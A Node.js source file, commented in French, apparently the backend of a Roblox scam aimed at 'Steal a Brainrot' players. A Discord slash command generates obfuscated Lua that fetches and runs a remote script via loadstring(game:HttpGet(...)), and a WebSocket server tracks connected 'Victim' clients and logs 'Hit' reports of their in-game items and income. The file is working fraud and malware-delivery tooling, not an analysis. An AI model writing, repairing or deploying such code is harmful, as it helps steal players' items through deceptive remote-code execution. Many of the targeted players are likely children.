const express = require('express');
const mongoose = require('mongoose');
const WebSocket = require('ws');
const http = require('http');
const url = require('url');
const luamin = require('luamin');
const { randomBytes } = require('node:crypto'); // Utilise le préfixe node: pour être sûr
const { v4: uuidv4 } = require('uuid');
const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder, Events, MessageFlags } = require('discord.js');
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
const axios = require('axios');

// --- CONFIGURATION ---
const PORT = process.env.PORT || 3000;
const MONGO_URI = process.env.MONGO_URI;
const ADMIN_TOKEN = process.env.ADMIN_TOKEN;
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;

const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);

const generateId = () => {
    return `wh_${randomBytes(8).toString('hex')}`;
};

async function obfuscateScript(luaCode) {
    try {
        log("🔍 [OBF] Sending to LuaObfuscator.com API...");

        const response = await axios.post('https://luaobfuscator.com/api/obfuscator/newscript', {
            Script: luaCode,
            Minify: true,
            CustomOptions: {
                "EncryptStrings": true,
                "RenameVariables": true,
                "ControlFlow": true,
                "Virtualize": false // Mets à true si tu veux une sécurité maximale (mais le script sera plus lourd)
            }
        }, {
            headers: {
                'Content-Type': 'application/json',
                'apikey': process.env.LUA_OBF_KEY // Ta clé API à mettre dans Render
            },
            timeout: 30000
        });

        // L'API de LuaObfuscator renvoie souvent un objet avec le code dans 'code'
        if (response.data && response.data.code) {
            log(`✅ [OBF] Success! Received professional obfuscation.`);
            return response.data.code;
        } else {
            // Parfois la réponse est directe ou structurée différemment selon le plan
            log("⚠️ [OBF] Unexpected response format, trying to parse...");
            return response.data.obfuscated || response.data;
        }

    } catch (error) {
        log(`❌ [OBF ERROR] ${error.response ? error.response.status : error.message}`);
        if (error.response && error.response.data) {
            log(`📦 [OBF DATA] ${JSON.stringify(error.response.data)}`);
        }
        return null; // On retourne null pour arrêter le process si l'obfuscation échoue
    }
}

// --- CONNEXION DB ---
mongoose.connect(MONGO_URI)
  .then(() => {
      log("✅ [DB] Connexion établie");
  })
  .catch(err => log(`❌ [DB] ERREUR : ${err}`));

// --- MODÈLES ---
const WebHookIdSchema = new mongoose.Schema({
    webhookId: {
        type: String,
        unique: true
    },
    url: {
        type: String,
        required: true,
        trim: true
    },
    ownerName: {
        type: String,
        required: true,
        trim: true
    }
}, {
    timestamps: true
});

const WebHookId = mongoose.model('WebHookId', WebHookIdSchema);

const activeVictims = new Map();
const activeBots = new Map();
const activeAdmins = new Set();


// --- BOT DISCORD ---
const clientDiscord = new Client({ 
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMessages, 
        GatewayIntentBits.MessageContent
    ] 
});

const commands = [
    new SlashCommandBuilder()
        .setName('generate-sab-trade')
        .setDescription('Generate a SAB Trade script')
        .addStringOption(option =>
            option.setName('username')
                .setDescription('List of Roblox usernames separated by commas')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('webhook')
                .setDescription('Discord Webhook URL')
                .setRequired(true))
        .addIntegerOption(option =>
            option.setName('income')
                .setDescription('Minimum income threshold (e.g. 10000000)')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('visual')
                .setDescription('URL for the visual interface (Optional)')
                .setRequired(false)) // Paramètre optionnel
].map(cmd => cmd.toJSON());

clientDiscord.once(Events.ClientReady, async () => {
    log(`🤖 Bot Discord connecté : ${clientDiscord.user.tag}`);
    const rest = new REST({ version: '10' }).setToken(DISCORD_TOKEN);
    try {
        log('🔄 Refresh des commandes slash...');
        await rest.put(
            Routes.applicationCommands(clientDiscord.user.id),
            { body: commands }
        );
        log('✅ Commandes slash enregistrées');
    } catch (error) {
        log(`❌ Erreur Slash Commands: ${error}`);
    }
});

clientDiscord.on(Events.InteractionCreate, async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'generate-sab-trade') {
        // 1. On prévient Discord qu'on va travailler (évite le timeout de 3s)
        await interaction.deferReply({ flags: [MessageFlags.Ephemeral] });

        try {
            const usernames = interaction.options.getString('username');
            const webhookUrl = interaction.options.getString('webhook');
            const income = interaction.options.getInteger('income');
            const visual = interaction.options.getString('visual') || "";
            
            const webhookUuid = generateWebhookId();

            // 2. Sauvegarde DB
            const newWebhookEntry = new WebHookId({
                webhookId: webhookUuid,
                url: webhookUrl,
                ownerName: interaction.user.tag
            });
            //await newWebhookEntry.save();
            log(`💾 [DB] Webhook mapped: ${webhookUuid}`);

            // 3. Préparation Code
            const userArrayLua = usernames.split(',').map(u => `"${u.trim()}"`).join(', ');
            const codeToObfuscate = `local fenv = getfenv()
fenv["Receivers"] = { ${userArrayLua} }
fenv["WebHook"] = "${webhookUuid}"
fenv["Visual"] = "${visual}"
fenv["MinIncome"] = ${income}
loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/SABTrde"))()`;

            // 4. Obfuscation (Assure-toi que axios est importé en haut !)
            const obfuscated = await obfuscateScript(codeToObfuscate);

            if (!obfuscated) {
                return await interaction.editReply("❌ Obfuscation failed.");
            }

            // 5. Réponse finale (Utilise editReply car on a fait un deferReply)
            const successEmbed = new EmbedBuilder()
                .setTitle("🚀 Script Generated")
                .setColor(0x00FF00)
                .setDescription(`Webhook ID: \`${webhookUuid}\`\n\n**Code:**\n\`\`\`lua\n${obfuscated.substring(0, 1800)}\n\`\`\``);

            await interaction.editReply({ embeds: [successEmbed] });

        } catch (error) {
            log(`❌ [ERROR] ${error.message}`);
            // En cas d'erreur après le deferReply, on utilise editReply
            if (interaction.deferred) {
                await interaction.editReply(`❌ Error: ${error.message}`);
            }
        }
    }
});

if (DISCORD_TOKEN) clientDiscord.login(DISCORD_TOKEN);

// --- GESTION WEBSOCKET ---
wss.on('connection', (ws, req) => {
    const params = new URLSearchParams(url.parse(req.url, true).query);
    const username = params.get('username') || "Unknown";
    const usertype = params.get('usertype') || "Unknown";
  
    if (usertype === "Admin") {
        activeAdmins.add(ws);
        log("👨‍💻 Un administrateur s'est connecté");

        ws.on('close', () => {
            activeAdmins.delete(ws);
            log("👨‍💻 Un administrateur s'est déconnecté");
        });
        return; // On s'arrête ici pour les admins
    }
  
    if (usertype === "Bot") {
        if (activeBots.has(username)) {
            log(`Bot ${username} déjà présent, remplacement...`);
            activeBots.get(username).terminate();
        }
    
        activeBots.set(username, ws);
        log(`🤖 Bot connecté : ${username}`);

        ws.on('close', () => {
            if (activeBots.get(username) === ws) {
                activeBots.delete(username);
                log(`💀 Bot déconnecté : ${username}`);
            }
        });
        return; // On s'arrête ici pour les bots
    }
  
    if (usertype === "Victim") {
        if (activeVictims.has(username)) {
            log(`Victim ${username} déjà présent, remplacement...`);
            activeVictims.get(username).terminate();
        }
    
        activeVictims.set(username, ws);
        log(`🤖 Victim connecté : ${username}`);

        ws.on('close', () => {
            if (activeVictims.get(username) === ws) {
                activeVictims.delete(username);
                log(`💀 Victim déconnecté : ${username}`);
            }
        });
      
        ws.on('message', async (msg) => {
          try {
              const data = JSON.parse(msg);
              if (data.Method === "Hit") {
                log(`🎯 Hit reçu de : ${data.Hit.Name}`);
                  
                if (data.Hit.Brainrots && data.Hit.Brainrots.length > 0) {
                  data.Hit.Brainrots.forEach((br, index) => {
                    log(`   [${index + 1}] Brainrot: ${br.Name} | Income: ${br.IncomeStr}`);
                  });
                } else {
                  log(`   ⚠️ Aucun Brainrot trouvé sur le plot.`);
                }
            }
          } catch (e) { log(`⚠️ Erreur Message WS: ${e.message}`); }
      });
      return; // On s'arrête ici pour les Victims
    }
    
});

app.use(express.static('public'));
server.listen(PORT, () => log(`🚀 Serveur actif sur le port ${PORT}`));
